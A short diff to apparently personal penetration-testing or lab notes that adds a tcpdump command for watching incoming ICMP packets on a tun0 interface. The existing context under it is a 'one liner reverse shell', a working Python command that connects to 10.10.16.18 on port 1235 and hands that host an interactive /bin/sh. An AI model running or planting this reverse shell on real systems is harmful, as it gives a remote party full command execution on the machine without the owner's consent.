@@ -1,3 +1,7 @@
+Following command can be use to observer coming icmp packets:
+
+tcpdump -i tun0 -n icmp
+
 One liner reverse shell:
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.18",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
